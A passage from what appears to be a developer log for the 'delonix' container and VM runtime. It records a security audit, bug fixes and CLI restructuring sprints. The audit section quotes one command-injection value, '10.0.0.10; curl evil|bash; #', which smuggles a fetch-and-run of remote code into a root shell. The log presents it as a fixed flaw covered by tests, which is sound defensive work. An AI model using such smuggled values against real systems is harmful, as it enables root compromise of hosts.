  in the same pattern (`super::names::random_name`, extracted from `kindmode::random_cluster_name` to
  be shared by the two) — collision checked against the existing VM names (a kubeadm cluster
  has no record of its own, it IS its VMs `<name>-cp1`/`<name>-w1`).
- `resolve_vm_image` now prefers the local convention name (`delonix-vm-k8s:<v>`) when the
  explicit value does not match any local image on its own — closing the case of an image
  already pulled by `vm pull` (which stores it under the full name) never being found by an
  abbreviated `--vm-image`.
- When, even so, there is no local image at all, `provision_and_apply` no longer gives up — it calls
  `vmimage::cmd_pull` against the official repository (`official_pull_source`, same normalization:
  a value with `/` is used as-is, a bare value or `delonix-vm-k8s:<v>` resolves against
  `ghcr.io/angolardevops/delonix-vm-k8s:<v>`), under the SAME local name that `resolve_vm_image`
  had already decided — the next call to `qcow2_path` finds it.

Validated live: `--vm-image 1.34` (already local, under `delonix-vm-k8s:1.34`) resolves without trying
any download; `--vm-image 1.35` (absent) prints "downloading from
'ghcr.io/angolardevops/delonix-vm-k8s:1.35'..." and starts the real pull; without `--name`, it generates
`nzinga-cacuaco-19` and proceeds to SSH key generation.

## Security audit (skill `delonix-runtime-sec`)

Before extending `delonix cluster apply`, a dedicated offensive audit was done (new skill
`skills/delonix-runtime-sec/`, a red-team profile specialized in container/VM
runtimes) — 3 adversarial reviews in parallel (command injection, privilege escalation/namespace
escape, memory safety + supply chain + path traversal).

**Verdict on the rootless→root boundary**: solid, no CRITICAL/HIGH. The holder's control socket
validates `SO_PEERCRED` correctly across user namespaces; `join_netns` only receives paths
generated server-side (never direct input from the CLI); uid mapping does not allow pointing at real
host uid 0 in any of the 3 paths (real root/rootless single-uid/rootless with subuid).

**4 CRITICAL findings confirmed and FIXED in this same session** (all in new code from this
session, which had never been reviewed adversarially):

1. **Command injection via the `Cluster` manifest** — `controlPlaneEndpoint`/`podSubnet`/
   `serviceSubnet`/`k8sVersion` entered without sanitation into a `format!` that becomes the BODY of a
   remote `sudo -n bash -c` (`cmd::cluster::kubeadm_init`/`kubeadm_join`). A `cloud.yaml` with
   `controlPlaneEndpoint: "10.0.0.10; curl evil|bash; #"` was RCE as root on the production host.
   **Fixed**: `cmd::cluster::{valid_endpoint,valid_cidr,valid_version}` — strict character whitelist,
   called in `validate()` before any interpolation. `shell_quote` (`remote.rs`)
   only protects the local ssh→bash-c boundary — it never sanitizes the CONTENT of the command; that was the
   lesson to retain (documented in the comments of the `valid_*` functions).
2. **Same vector via `k8sVersion` in `k8s_recipes::k8s_host_recipes`** (apt repository,
   run on ALL hosts, including before `kubeadm init`) — **fixed** with the same
   validation, reused also in `vmimage::cmd_build` (`--k8s-version` has the same path).
3. **`pull_oci_artifact` did not verify the received blob's digest** against the manifest — a
   compromised `ghcr.io` registry could serve a tampered golden VM image without detection.
   **Fixed**: `sha256(bytes) == expected_digest` verification before returning, same pattern
   already used by `pull_from_registry_with_creds` (which was already correct).
4. **Path traversal in `delonix build`'s `COPY`** — a Dockerfile/Delonixfile's `src`/`dst` were
   not confined to the context/rootfs (`..` not neutralized). **Fixed**: `cmd::build::
   safe_join` (same pattern as `safe_rel` in `delonix-oci::overlay`), rejects any
   `..`/absolute component outside the base.

**2 LOW findings, defense in depth, also fixed**: `--` before `user@host` in the
argv of `ssh`/`scp` (`remote.rs`); `VmImageStore::base_cache_path` now uses `sanitize()`
like the store's other methods (`vmimage.rs`).

All 4 CRITICALs have an automated test replicating the exploit and confirming the rejection (`cargo
test -p delonix-runtime-bin`/`-p delonix-oci`) — see `cmd::cluster::tests::
validate_recusa_endpoint_malicioso_no_manifesto_completo`,
`registry::tests::pull_oci_artifact_recusa_blob_adulterado`,
`cmd::build::tests::safe_join_recusa_dot_dot`.

## Broad code/architecture review (2026-07-27) — real bugs fixed + documented debt

Explicit user request before the public release: a code AND architecture review
(not just security) over the ENTIRE repository, with doubled focus on the most recent code (dash/
metrics, `compose.rs`, the CLI reorganization). 4 audits in parallel — the summary in
`docs/COMPARACAO-DOCKER-PODMAN.md` does not apply here (it is specific to the Docker/Podman gap); the
architecture findings are recorded in this section.

**7 real bugs confirmed and FIXED**:

1. **`compose.rs`: `depends_on: condition: service_completed_successfully` without a timeout** —
   `wait_for_condition` was a `loop {}` with no exit other than Ctrl-C if the dependency never left
   the Running state (e.g. a wrong condition on a long-running service, or `restart:always` cycling
   back to Running). Fixed with a generous ceiling (30 min) + a progress heartbeat
   every 30s — no longer silently indistinguishable from a hang.
2. **`compose.rs`: a `host_ip:host:container` port (e.g. `127.0.0.1:9000:80`) silently discarded the
   IP** — **SUPERSEDED on 2026-07-27**, and this entry misled whoever read it afterwards (it cost
   a failed check on 2026-08-15): the `parse_publish_addr`/`publish_bind_addr` from the same series gave
   the engine REAL support for the `[hostIp:]hostPort:contPort` form, so compose **no longer refuses, it
   HONORS**. Measured: `ports: ["127.0.0.1:19099:80"]` → `container port` says `127.0.0.1:19099` and
   `ss` confirms the bind on loopback, with nothing on `0.0.0.0`. What the fixed battery checks today is the
   ADDRESS, not the refusal — a discarded IP would publish again on all interfaces, and that
   is the regression that matters to catch. The original text, for historical context: — it fell into the 2-part path (`hostPort:containerPort`), publishing on ALL
   interfaces exactly the opposite of what the compose file requested (bind to loopback only). Fixed
   to refuse explicitly (the engine itself already refuses `-p 127.0.0.1:...` — `parse_publish` requires
   a digits-only host_port), consistent with the module's own rule of never degrading silently.
3. **`compose.rs`: `<project>_<key>` network/volume names could collide between different
   projects** — `format!("{project}_{key}")` is not collision-free (`project="a_b" key="c"` and
   `project="a" key="b_c"` both gave `"a_b_c"`); networks/volumes have no labels field, so
   `compose down` recomputes the name from scratch — a collision made a `down` of one project delete
   ANOTHER's resource. Fixed with a prefix-free encoding (`compose_scoped_name`: each
   literal `_` in project/key is doubled before the join).
4. **`compose.rs`: `shlex_split` escaped one backslash too many inside double quotes** — POSIX only gives
   special meaning to a backslash before a dollar sign, backtick, double quote, the backslash itself, or a
   newline, inside `"…"`; any other character keeps the backslash. The parser treated all
   backslashes the same way, silently changing the argv of a command with a pattern like
   `"grep \d+ file"`. Fixed to follow the exact POSIX rule inside double quotes (outside
   them, the behaviour — escape whatever comes next, unconditionally — stays).
5. **`firewall.rs`: ALL mutation paths bypassed the `Store`'s `flock`** — `ingress
   allow/deny/rm/clear`, the `egress` equivalents, `apply_container_ingress`, and the manifest apply
   did `store.load` → mutate in memory → `infra::apply_firewall` (kernel) → `store.save`, WITHOUT
   ever going through `Store::update` (whose own doc-comment says it exists precisely to
   sequence this read-modify-write between processes). Real race: two firewall commands
   against the same container (or a firewall command competing with a concurrent reconciliation)
   both applied to the kernel successfully, but only the last `save` survived on disk
   — the "losing" rule stayed live in `nft` but absent from the persisted record, and vanished
   silently on the next `container start` (which only reapplies what is persisted). Fixed
   with a new `update_locked` (a local helper wrapping `Store::update` for a closure that can
   itself fail) — all 6 mutation points now go through the `flock`. Validated live
   (allow→deny→rm→policy→clear, end-to-end, the persisted state matches the real `nft`).
6. **`peer_uid()` (`SO_PEERCRED` extraction) duplicated verbatim in 4 places** — `delonix-cri`,
   `delonix-mgmt`, `delonix-sdn::infra`, `cmd/dockerapi.rs`, all four already depend on
   `delonix-runtime-core`, with no crate-boundary reason for the duplication (unlike
   `dir_size`, which genuinely cannot be shared without a circular dependency). Consolidated in
   `delonix_runtime_core::peer_cred::peer_uid` — a single place from now on.
7. **Dashboard/metrics: no timeout on the expensive collection (network+disk), and the total traffic
   silently counted a `--net host/none` container as "0 bytes"** — see the "Resource KPIs"
   section above for the full detail of both findings and the fixes (`collect_with_timeout`
   with a 120s ceiling + deliberate leak of the stuck thread instead of a permanent hang; new field
   `network_unmeasured_containers` exposed in the tile/JSON/Prometheus gauge instead of summed as zero).

**3 architecture findings documented as known debt in the original review — 2 CLOSED
on 2026-07-27, 1 still open**:

- ✅ **DONE — network creation now has rollback on partial failure.** `create_network` (bridge) did
  `store.create(name)?` (declarative) and only THEN `infra::network_create_with(...)?` (physical); if the
  second failed, the first's record was orphaned — `network ls` showed the network, nothing
  could attach to it (`NotFound`), and a `create` retry failed with "already exists" until a
  manual `network rm`. Fixed: if `network_create_with` fails, the newly-created record is removed
  (`store.remove(name)`) before propagating the error — a failed `create` leaves nothing behind.
  Validated live for the happy path (unchanged); the failure path was not triggered live (it requires
  forcing `infra::network_create_with` to fail on a real host), but the logic is a pure store
  reversal, with no privilege-boundary risk. **`overlay` still has the same pre-existing
  limitation** (the message promises "reconciles on the next `network create`", but
  `NetworkStore::create_overlay` is not idempotent) — out of scope for this fix, which only covered
  `bridge`.
- ✅ **DONE — `JsonStore<T>` gained a generic `update`, same pattern as `Store<Container>`.**
  A new `JsonStore::update` (lock via `flock`, re-reads under the lock, applies `f`, writes) — same form as
  `Store::update`, generalized over `T: Serialize + DeserializeOwned`. `delonix_vm::status()`
  (which did `load`→mutate(IP)→`save` with no lock at all, running concurrently with the background
  metrics refresh of the dash/`delonix-mgmt` alongside `vm start/stop/create` from the CLI) now
  uses `st.update(name, |vm| {...})` — the query to the backend (`is_running`/`ip`) and the decision
  all run inside the critical section. A pure regression test by real concurrency
  (`jsonstore_update_concorrente_nao_perde_escritas`, same pattern of threads +
  `sleep` in the middle of the race window that `update_concorrente_nao_perde_escritas` already used for the
  sibling `Store<Container>`) — without the lock it would lose writes, with the lock all 24 had to match.
  Validated live: `vm ls` (which calls `status()` for each VM) keeps working identically.
- **`spawn()` (`crates/adapters/delonix-linux/src/lib.rs`) is a ~405-line function** — still open,
  covering
  hostname/argv preparation, pty/socketpair setup, clone-flag computation, the
  `clone()` itself, a userns handshake whose correctness depends on an ordering documented only in
  comments ("CRITICAL ORDER"), fork+detach of the log shim, the network hook, cgroup setup and
  `Store::save` — all in a single function. The internal error handling is careful, but the size is
  a real maintenance risk (a future edit that reorders two blocks could reintroduce a
  deadlock/race that the comments themselves already document as having existed). It is not a live bug —
  it is a note for whoever touches that next.

### v0.32.1 — 3 findings during the systematic test of every command group

Direct continuation of the review above: testing live each CLI group/subcommand/parameter before
the release (not just reading code) caught 3 problems the static review had not seen.

1. **`secret create` had no stdin path** — the docs' own cheatsheet showed `printf
   's3nha' | delonix secret create db-pass` as a terse way to create a secret without touching the argv/
   shell history, but the command only accepted `--from-literal KEY=value`/`--from-env-file
   <file>` — the very documented example failed with "empty secret". Fixed:
   `--from-env-file -` reads from stdin (the `-` convention), same `KEY=value` parser as a normal `.env`.
2. **`Error::NotFound` (shared by secrets/networks/volumes/images/...) always said "no such
   container: X"** — only `Store<Container>`'s two call-sites depended on the fixed Display; the others
   stores already embedded the right prefix in the string itself. A `secret rm <nonexistent>` responded
   literally "no such container: secret X". Fixed at the root (generic Display `"no such
   {0}"` + the two `Store<Container>` call-sites providing their prefix) — validated live
   that `secret`/`volumes`/`network` now name the right resource, and that `container
   rm`/`stop`/`net ingress ls` (via `firewall.rs`) did not regress.
3. **`stack init` generated an outdated comment about `network:` in rootless** — it said it
   had "a KNOWN limitation... only works as root", a note from a version before
   `reexec_into_netns` (see the "CLI" section above) closed that problem. Confirmed live
   (`container apply` with `network: <network>` gets a real IP in rootless) and the scaffold's comment
   corrected to reflect the current state — `--net host` is still the scaffold's default only for
   simplicity, not because `network:` is limited.

### v0.32.2 — 380+ hardcoded PT strings outside the i18n catalogue, across 26 files

Finding #2 above (`manifest.rs`) was just the tip: a full sweep (parallel agents +
a 2nd manual pass) found the SAME class of bug — hardcoded Portuguese text, visible even in
EN by default — in `bins/delonix-runtime-bin/src/cmd/{build,cluster,conditions,container,
dependency,etcd,firewall,httproute,image,ingress_proxy,kindmode,kube,lb,manifest,mapped,network,
scaffold,scan,secret,sharevolume,stack,storage,system,tunnel,vm,vmimage,volume}.rs` — 380 strings
in total, moved to `po::t`/`po::tf` + `pt.po` (352+ new entries). Two gender-agreement
traps caught before corrupting the catalogue (the same EN key "created" already
existed translated as *criada* for "a rede" — reusing it for "o volume" would have produced
*criada:* where it should be *criado:*; resolved with distinct keys per context, never sharing
a `msgid` whose `msgstr` depends on the subject's gender). Taken as an opportunity to fix 3 outdated
public-doc pages (`docs/gen.py`): `serve docker-api` described as read-only (it is a full
lifecycle since v0.26.0), `cluster kubeadm` described without HA support (the automatic
HAProxy exists since v0.13.0), `network` described as only `bridge` physically realized (the
`overlay` is too, for several versions) — and an entirely missing page (`delonix compose`, zero
documentation since v0.29.0). Validated live: build/clippy/fmt/test clean, EN by default +
exact PT via `--l18n=pt` across several samples, including per-language independent column
alignment in `volumes inspect`.

## CLI restructuring (Docker/Podman/kubectl semantics) — Sprint 1: `secret create` vs `secret set`

An audit session (2026-09-12, DevOps/Platform/SRE persona, Docker/Podman/
kubectl comparison baseline) found a genuine ambiguity: `secret create` and `secret set` answered the same
question ("a secret with this name does not yet exist") in two ways indistinguishable by the
verb's name — the only thing separating them was the `--help` text. The PREVIOUS finding of this same
family (`create` silently deleting keys when replacing) had already been fixed the day
before (ACH-024..027, #278, `15b09162`) — that fix stays intact and is not reverted here.

**What #278 lacked**: `create` still ACCEPTED replacing an existing secret, only now
warning loudly instead of silently. `secret create db-pass` over an already-used name always
responded (never refused), which is not the guarantee that `kubectl create secret`/`docker secret
create` give — in both, `create` only creates, and trying again over an existing name is an error.

**Closed**: `secret create` gained `-f`/`--force`. Without it, it refuses (`Error::Conflict`, exit
code `5`/`DX_CONFLICT` — already existed, with no producer in this group) if the name already exists, pointing
to `secret set` (upsert) or `secret create --force` (the replacement already fixed in #278,
including the message naming the dropped keys). `secret set`/`secret apply` (declarative
path, `kind: Secret`) stay **outside** this refusal on purpose — `apply` has to remain
idempotent ("ensure present"), and only the imperative verb `create` gained the requirement of explicit
intent. Validated live (isolated `DELONIX_ROOT`): creating again without `--force` leaves the
original secret intact (confirmed by `secret inspect --reveal`); with `--force`, it replaces and
names what it dropped; `secret apply` of the same `kind: Secret` twice in a row stays `rc=0`
without asking anything. Gate in `scripts/e2e.sh` (`secret` section), with the `create --force` case kept
alongside the new case (refusal) — there is no regression of what #278 already guaranteed.

Part of the CLI restructuring plan requested in this session (remove ambiguities/duplicates,
bring Docker/Podman/kubectl semantics, preserve the network/volume hot-plug in
`container update` as a differentiator) — the following sprints (dedup `vm`/`image vm`, `network
connect/disconnect`, `volume create --driver`+`--opt`, `container ssh`→`shell`, consolidation of
the 6 dashboards, `system backup`→`system snapshot`) are left to their own sessions, each in its
worktree, each with its PR — a clean cut, no alias, like all the rest of this CLI.

## CLI restructuring (Docker/Podman/kubectl semantics) — Sprint 2: `container ssh` removed

The DevOps/SRE audit (2026-09-12) flagged `container ssh` as a name collision (the same
word as `vm ssh`, with opposite semantics — one is a local `exec -t`, the other real SSH over the network).
Before inventing its own resolution, `docs/discovery/51_CLI_INVENTARIO.md` §10.4 already had the
decision written, from an earlier phase of this same restructuring (Phase CLI-0/CLI-5): remove
`container ssh` entirely and absorb the only real value it had — the "try `bash`,
fall back to `sh`" fallback — into `container exec` when it runs without `COMMAND`. Neither Docker nor Podman has a
separate `ssh` verb; `exec` is what both teach.

**Clean cut**: `container ssh` fails with `unrecognized subcommand`. `container exec` gained the
fallback (`command` is no longer `required`) and the doc-comment/`--help` say so.

**Real inherited bug, found validating live — not reading code.** The argv that `cmd_ssh`
always used was `exec /bin/bash 2>/dev/null || exec /bin/sh`. Measured against `busybox sh`/`dash`
(outside delonix, to isolate the cause): an `exec` that fails because the binary does not exist **terminates
the non-interactive shell locally** — it never reaches the `||`. Against `alpine` (no `bash`), the fallback
that `container ssh` had always promised **never ran** — the command failed pretending that the
second half of the `||` would save it, and it would not. Fixed to `command -v bash >/dev/null 2>&1 &&
exec bash || exec sh`, which only tests the binary's presence. Validated live on both sides: an
`alpine` container (no bash) falls back to `sh`; an explicit command keeps working
unchanged.

Scope isolated to `bins/delonix-runtime-bin/src/cmd/container.rs` + `manual_entries.rs` +
`docs/gen.py` + `scripts/cli_baseline.tsv`/`cli-tree.sh` (the `container ssh` leaf, class `→`
since Phase CLI-0, leaves the baseline in the same commit that removes it from the binary). `vm ssh`
untouched.

## CLI restructuring (Docker/Podman/kubectl semantics) — Sprint 3: 6 dashboards → `dashboard --scope`

`docs/discovery/51_CLI_INVENTARIO.md` §9/§22: `container dash`/`image dash`/`network dash`/
`volume dash`/`vm dash` removed — the engine behind them was already a single shared `DashScope`/`DashData`/`run`,
the only duplication was the `clap` shell (6 copies of `{once, json}` delegating in one
line). `dash` was never a Docker/Podman/kubectl verb with a familiar per-domain form to
preserve (unlike `ls`/`apply`), so this CLI's rule of keeping
the familiar verb alongside the generic one does not apply here.

`dashboard --scope <all|container|vm|network|volume|image>` (omit = `all`, the long-standing
behaviour). `DashScope` gained `clap::ValueEnum` with names renamed to match the group
nouns already used in the rest of the CLI (`Vms`→`vm`, `Storage`→`volume`, `Images`→`image`).

**Clean cut**: the 5 `<group> dash` fail with `unrecognized subcommand`. `manual_entries.rs`
lost the 5 "`<group> dash`" `Entry`s (the `see_also`s that pointed to them now point to
`dashboard`); `docs/gen.py` lost the same 5 example blocks and gained the `--scope` example in
`dashboard`; `scripts/cli_baseline.tsv` dropped from 245 to 240 leaves.

Validated live: `dashboard --once` (global view), `dashboard --scope container --once`
(focused), and the 5 old forms failing with `unrecognized subcommand`.

## CLI restructuring (Docker/Podman/kubectl semantics) — Sprint 4: `system backup`/`restore` → `system snapshot create`/`restore`

The DevOps/SRE audit (2026-09-12) flagged `system backup`/`system restore` as a name collision
with the `backup` group (archive of ONE resource) — not a scope one, the two were already different objects
and documented as such since v0.67.0 (ADR-0020 had classified them as "a second door" and it
was corrected). The first reading of this audit treated that v0.67.0 decision as definitive and
dropped the sprint; reconsidered on request — the decision to KEEP THE SCOPES SEPARATE stands
(and is not touched here), but nothing in it prevented changing only the NAME of the node-level verb.

**What changes**: `system backup`/`system restore` → `system snapshot create`/`system snapshot
restore` — same vocabulary as `vm snapshot`/`volume snapshot` (capture at an instant), now at the
node scale instead of one resource. The scope, the archive format (`FORMAT = 1`, unchanged), and
everything each verb does stay exactly as they were — only the word shared with `backup`
disappears, which was the real source of the confusion (the `--help` itself already needed a paragraph
to explain "this is not a second door").

Clean cut: `system backup`/`system restore` fail with `unrecognized subcommand`. The internal
names (`cmd_backup`/`cmd_restore` in `backup.rs`) stay as they are — implementation, not
surface; the module's prose and error messages (`io_err("system backup")` etc.) were
updated to cite the real command.

## CLI restructuring (Docker/Podman/kubectl semantics) — Sprint 5: `network connect`/`disconnect`

The DevOps/SRE audit (2026-09-12) flagged `--net-connect`/`--net-disconnect` as flags buried
in `container update`, next to ports/volumes/limits — the only thing there that is not about the
CONTAINER itself, it is about membership of a NETWORK. Checked first against the discovery docs
(`51_CLI_INVENTARIO.md`): there is no decision written specifically about this — the document's long-term
vision for `network`/`net` is a much larger declarative migration (all via `apply
-f` against Kinds like `NetworkPolicy`/`Service`), clearly out of a sprint's scope, and which
does not prevent this modest, local imperative improvement.

**What changes**: `network connect <NETWORK> <CONTAINER>` / `network disconnect <NETWORK> <CONTAINER>` —
Docker's own verb and argument order (`docker network connect NETWORK CONTAINER`).
Mechanism identical to what already existed (`infra::attach_extra_container`/`detach_extra_container`,
the same guards — refuses on `--net host/none`, refuses a duplicate, reapplies the firewall to the new/
old IP), extracted into `cmd_network_connect`/`cmd_network_disconnect` (`pub(crate)` in
`container.rs`, called from `network.rs`).

**Deliberately NOT moved**: `--net-rate`/`--net-burst`/`--net-rate-clear` (bandwidth limit)
stay in `container update`. They are not about WHICH network — they are a limit of the container itself,
a sibling of `-m`/`-c`, and Docker has no equivalent verb to align with. Only network membership
(which network the container is on) had a Docker verb waiting.

Clean cut: `container update --net-connect`/`--net-disconnect` fail with "unexpected
argument". `container update` keeps `--publish-add/-rm`, `--volume-add/-rm`, `--net-rate/
--net-burst/--net-rate-clear`, `-m`, `-c` — sharper for lacking what did not belong there.
## CLI restructuring (Docker/Podman/kubectl semantics) — Sprint 6: `volume create --driver/--opt`

User request: eliminate the CLI's ambiguities and duplicates and bring in semantics aligned with
Docker/Podman/kubectl, sprint by sprint, one command group at a time. Sprint 6 closes out `volume
create`, whose `--help` had accumulated TWO forms for the SAME network-sharing information — the
friendly one (`--type`/`--server`/`--share`/`--username`/`--password`/`--password-secret`/
`--read-only`) and the raw one (`--driver nfs`+`--device`+`--options`) — inherited without merging from the earlier B5
mergers (`storage create` and `volume create`'s own raw `--driver nfs`).

**The new form is a single one**, in the style of `docker volume create --driver <name> --opt k=v`:

```
delonix volume create <nome> --driver <local|nfs|cifs|smb|webdav> [--opt chave=valor]... [--quota <q>] [--alert-pct <n>]
delonix volume create <nome> --parent <volume> [--namespace <ns>] [--quota <q>] [--alert-pct <n>]
```

`--opt` accepts `server`/`share`/`username`/`password`/`password-secret`/`ro`/`options` — exactly
the same keys the old friendly form covered, just as repeatable pairs instead of one flag
per key. `--driver local` (the default) accepts no `--opt` at all — an `--opt` with `local` is the same
class of error that passing `--type`/`--server` nonsensically was before. **The raw form `--driver
nfs`+`--device` was ABSORBED, not preserved as a third path**: `--opt server=<host> --opt
share=<caminho>` produces the SAME device string (`server:/caminho`) that `--device` wrote by hand, and
keeping it alongside would be the same information written twice in two different forms that this
sprint exists to close. `--parent` remains exclusive (`conflicts_with`) with `--driver`/`--opt` —
it is the third old form (`sharevolume`/quota slice), which does not change.

**Clean cut, no alias** (`volume` is not yet in `docs/cli-stability.md` — see the table of
stable groups): `--type`/`--server`/`--share`/`--username`/`--password`/`--password-secret`/
`--read-only`/`--device`/`--options` cease to exist; a script that still uses them fails with
`unrecognized argument`, never silently.

## CLI restructuring (Docker/Podman/kubectl semantics) — Sprint 9: `image vm`/`image --vm` → `vm image`

User request: `delonix image` should be only for CONTAINER images; everything that manages
VM disks moves inside `delonix vm`. The question had an already-measured answer before any
code: the `image --vm <verbo>` form (a flag reinterpreting the same group as another
Kind) had already been dropped in Phase B6 (2026-09-02, commit/PR #214) — the `skill delonix-feature-dev` already
considered it closed, and it was this section of AGENTS.md that still named "3 entry points" because it had never
been corrected at that time (see the notes marked "the 3rd spelling no longer exists" below). What
remained — and was the real point of the request — was the nested `image vm <verbo>` alongside FIVE verbs
that had already left the nested group to sit FLAT directly under `delonix vm`
(`build`/`convert`/`ls-remote`/`pull`/`push`), leaving half the surface inside `image vm`
and half already outside it, with no one having decided the final form.

**The new form is a single nested group**, in the style of `docker image <verbo>` — all TEN VM
image verbs (the five that were already flat + the five still in `image vm`) sit
under `vm image`, never loose directly under `vm`:

```
delonix vm image build|convert|describe|import|init|ls|ls-remote|pull|push|rm
```

`delonix vm` is left with only the lifecycle of an INSTANCE (`create`/`ls`/`start`/`stop`/`rm`/…) —
the same distinction that `container`/`image` already make for containers, and that this Kind had never
had: before today, asking "does `vm ls` list instances or disks?" required reading the `--help` twice.

**`VmImageCmd` (`cmd/vmimage.rs`) remains the ONLY implementation** — it is the `vm pull`/`vm
build`/etc. that already ran flat, plus the `image vm X` that ran into `cmd/image.rs` via
a `VmSub` that was a 1:1 field-by-field mirror of the same enum, with a block of manual
key-by-key conversion between the two. **That `VmSub` and its conversion block were REMOVED
entirely** (not redirected) — it was the SECOND copy of the same enum that this Sprint exists to
close, and keeping it as an alias would once again duplicate what the consolidation removes. `VmCmd` gained a
variant `Image { action: VmImageCmd }` that delegates cleanly, and the five `VmCmd::{Pull,
LsRemote, Push, Convert, Build}` that existed flat were deleted (they no longer have a variant
of their own — their work is now done by the generic `Image`).

**Real bug inherited from this duplication, fixed along the way**: the "BUG FIXED HERE" comment that
lived inside `VmImageCmd::Pull` (see line 697 from before this Sprint) narrated a real defect
from when there were TWO separate CLI definitions — `cmd/vm.rs` once had its own copy of
`vm pull` with its own copy of this same resolution, and that copy never gained the default "no
argument = official image" that the struct's doc-comment already promised. A user on a real host
hit this: `delonix image vm pull --name delonix-vm-k8s:1.34` (without `source`) replied "required
arguments were not provided: <SOURCE>". With this Sprint there is only ONE copy of this resolution to
diverge — the bug class cannot happen again, because there is no second copy to
reintroduce it.

**`manual_entries.rs` had the SAME duplication, and worse**: 11 `Entry` for `image vm *` and, alongside,
7 FLAT `Entry` for `vm build`/`convert`/`ls-remote`/`pull`/`push`/`init` describing the SAME
commands — with DIFFERENT (not identical) example sets between the two copies. Merged
into a single set of `vm image *` entries, with the richer examples of each pair preserved; the
7 duplicated flat entries were deleted.

**Clean cut, no alias.** `delonix image vm <verbo>` and `delonix image --vm <verbo>` fail with
`unrecognized subcommand`/`unrecognized argument`, never silently; `vm build`/`vm convert`/`vm
ls-remote`/`vm pull`/`vm push` (the previously flat forms) likewise. `vm` is on the list of groups NOT yet
stable in `docs/cli-stability.md` ("`cluster`, `vm`, `pod`, `workload`, `net`,
`systemcontainer`"), so there is no semver promise to protect here.

**`docs/gen.py` had the SAME structural duplication as `manual_entries.rs`**: the entry
`GROUPS["image"]["subs"]["vm"]` called `delonix image vm --help` (a real binary, to generate the
page), and `GROUPS["vm"]["subs"]` had FLAT entries `convert`/`push`/`ls-remote`/`pull`/`init`
(this last one with a `--vmfile` example, the flag this Sprint also removed). The two were
merged into a single `GROUPS["vm"]["subs"]["image"]`, with the same care to preserve the examples from
both sides — and the parallel `EXAMPLES_EN` (a list of captions by POSITION, not by
dictionary) had to be recomposed in the same order, otherwise the generator refuses with "N caption(s)
EN for M example(s)" instead of publishing the two languages misaligned.

**Note for whoever reads this section of the file before Sprint 9**: several older entries
in this AGENTS.md (the "Golden VM image" section just below, and scattered notes in `cluster.rs`/
`rbackup.rs`/etc.) still said "3 entry points" (`vm`, `image vm`, `image --vm`) after
B6 had already closed the third — they stay as they were because they are historical narration (what was true
WHEN they were written), but the current state is the one in this section: ONE entry point,
`delonix vm image <verbo>`.

## `delonix init -t <template> --up` ran a `container run` apart from the manifest (2026-09-13)

User request: `init -t` should be born already working. While investigating
`--up` (which already existed — build + start + wait for health + print the
URL), a real bug was found: `build_and_up` (`cmd/scaffold.rs`) built
the image and then started it with a `container run --name X -d -p
porta:porta tag` written by hand, **without looking at the `delonix-manifest.yaml`
it had just generated**. That ignored network, volumes, extra containers, and even
fields of the container ITSELF — `memory`/`cpus`/`restart`/`readOnly`/`tmpfs`,
all declared in the manifest and none reaching the container via `--up`.

**The `odoo` template already said this in its own comment**: "Odoo will not
boot without the database, so `stack apply` (not a lone `container run`) is
the way in" — `--up` violated exactly that sentence on first use (the
`odoo` web container would start on its own, without network or database, and would never
become healthy).

**Fixed**: `build_and_up` now calls `delonix stack apply` — the SAME
command the "next steps" text (without `--up`) already tells the user to run
by hand. There are not two ways to bring the project to life, only one, and now the
two (`--up` and the manual path) go through the same one. Validated live (template
`node`): before the fix `container inspect` showed no `readOnly`/`tmpfs`
at all when generated via `--up`; afterwards, `memory_max: 512M`, `cpus: 1.0`,
`restart_policy: always`, `read_only: true`, `tmpfs: ["/tmp"]` — all the
manifest's fields, confirmed in the container's real record.

**Separate finding, not fixed here**: publishing a host port already taken
by a process that is NOT another delonix container (measured with a system
process listening on `:8080`) makes `container run -p 8080:8080` **hang**
15s+ instead of refusing quickly with the "port in use" error the engine already gives
for other conflicts. Reproduced both via raw `container run` and via
`stack apply` (the same `cmd_run` under both) — it is not a regression
of this fix, it is a pre-existing bug in the slirp publish path.
Flagged for its own investigation.

New gate in `scripts/e2e.sh` (section "stack init --template --up"): generates the
`httpd` template (the fastest, no package manager), runs `--up` with a
180s ceiling, and confirms the manifest's `memory_max` in the real container — skips
with a clear reason if the environment does not complete (slow network, or the finding above).

## `delonix init` adopts an existing project instead of generating over it (2026-09-13)

User request: `init` should be able to turn an ALREADY EXISTING project
into a delonix app, not just generate one from scratch. Measured before writing code: it already
did not write over files with the SAME name (the `--force` guard),
but it still generated the whole template's example code alongside the
real code — a demo `src/index.ts`/`README.md`/`package.json`
would appear in a real Node project that already had its own `server.js`, and the
generated `Delonixfile` always assumed the demo's file layout (`COPY
src ./src`, `CMD ["node", "dist/index.js"]`), never the real project's.

**Closed**: `render_template` (`cmd/scaffold.rs`) switches to ADOPTION mode
when the target directory already has content (`dir_has_content`, a generic
signal — not per-template evidence, precisely to also cover
re-running `init` a second time over ITS OWN output, which must not
dump the example code over edits already made again). In
adoption, only three files are written — `Delonixfile`/`delonix-manifest.
yaml`/`.dockerignore` — never `src/`, `test/`, `README.md` nor the language
manifests (`package.json`/`go.mod`/`pyproject.toml`/...) of the template.

**Honest about what it does not solve**: the `Delonixfile` generated in adoption
STILL assumes the demo's file layout (there is no introspection of the
real project — reliably inferring the right entry point of 11 different
ecosystems, without guessing, would be left for its own slice).
So the final message is an explicit WARNING to review COPY/CMD before
`build`, never "done" — `build` fails loudly if the COPYs do not match
the real structure, which is the safe behaviour; the case where the
paths happen to coincide (e.g.: the real project already has a `src/` folder)
works with no editing at all.

6 new tests (`cmd::scaffold::tests`): `dir_has_content` in the three cases
(nonexistent/empty/with content), the full scaffold in an empty directory
remains intact (regression), adoption writes only the glue and preserves the
real code, and a second pass over its own output does not recreate the
example code.

## CI/CD, SonarQube and gitflow/semver ready in the 7 templates with real code (2026-09-13)

User request: every `init` project should have a CI/CD flow
ready for GitHub and GitLab, SonarQube config, gitflow, semver and semantic
commits already configured. Measured before writing a single YAML: each template's
REAL `package.json`/`pyproject.toml`/`composer.json`, so that the CI only invokes
commands that actually exist — never invented.

**Scope, decided with the user**: only the 7 templates with application code
and their own tests (`go`/`python`/`django`/`node`/`nestjs`/
`nextjs`/`laravel`). `httpd`/`nginx`/`haproxy`/`odoo` are left out — they have no
user code nor tests for a pipeline to exercise, and a generic workflow
there would be decorative.

**What each template gained**: `.github/workflows/ci.yml` + `.gitlab-ci.yml`
(the exact command the `README.md` itself already documents for running
locally — `go build/vet/test`; `uv sync` + `ruff check` + `pytest`;
`manage.py check` instead of `pytest` in `django`, which has no tests yet;
`pnpm build`+`test` in `node`; only `pnpm build` in `nestjs`/`nextjs`, which have no
